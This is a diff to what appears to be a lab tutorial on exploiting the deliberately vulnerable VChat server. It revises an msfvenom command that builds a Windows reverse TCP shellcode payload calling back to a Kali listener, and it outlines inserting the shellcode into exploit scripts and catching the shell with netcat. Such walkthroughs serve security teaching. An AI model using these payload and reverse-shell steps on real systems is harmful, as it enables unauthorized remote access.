@@ -262,19 +262,21 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 1. We first need to generate some shell code to inject into the process. We will use the [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to both generate shellcode and encode it to ensure it is transmitted properly. We **must** encode the resulting shellcode so it does not contain any null bytes `0x0`, carriage returns `\r` or newlines `\n`, as their presence would prevent the shellcode from properly executing by breaking the transmission, reception or execution of the shellcode. **Note**: you may need to type the command since copy and paste may not work.
 
 	```sh
-	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
     	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
     	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
     	* `EXITFUNC=thread`: Create a thread to run the payload.
-  	* `-f`: The output format. 
+	* `-f`: The output format. 
     	* `python`: Format for use in python scripts.
   	* `-v`: Specify a custom variable name.
     	* `SHELL`: Shell Variable name.
+  	* `-a x86`: Specify the target architecture as `x86`
+	* `--platform windows`: Specify the target platform as Windows
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values. 
-      	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
+      	* `\x00\x0a\x0d`: Null char, carriage return, and newline. 
 
 2. Insert this into your exploit python code as shown in [exploit4.py](./SourceCode/exploit4.py) or [exploit5.py](./SourceCode/exploit5.py). The only difference between the two is that the extra padding at the end of [exploit4.py](./SourceCode/exploit4.py)'s payload `b'C' * (5000 - 2003 - 4 - 32 - len(SHELL))` is not needed.
 3. Launch a [netcat](https://linux.die.net/man/1/nc) listener on our *Kali Linux* machine listening on port 8080, so we can receive the outbound connection from the target. 
@@ -301,11 +303,11 @@ Now we cn run VChat directly. Alternatively, we can run VChat in Immunity Debugg
 		<img src="Images/I23.png" width=800>
 
      4. Once you are satisfied we are executing the shell code, click the continue (Red arrow) button to allow it to execute.
-5. Look around in your netcat terminal! You should see a shell like the one shown below. Just note that Windows defender may kill it if you have protections enabled!
+1. Look around in your netcat terminal! You should see a shell like the one shown below. Just note that Windows defender may kill it if you have protections enabled!
 
 	<img src="Images/I24.png" width=800>
 
-6. Once you are done, exit the netcat program with ```Ctl+C``` to signal and kill the process.
+2. Once you are done, exit the netcat program with ```Ctl+C``` to signal and kill the process.
 
 
 ### (Optional) VChat Code 
@@ -377,3 +379,5 @@ void Function3(char *Input) {
 [4] https://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html
 
 [5] https://samsclass.info/127/proj/p18-spike.htm
+
+[6] https://owasp.org/www-community/Fuzzing
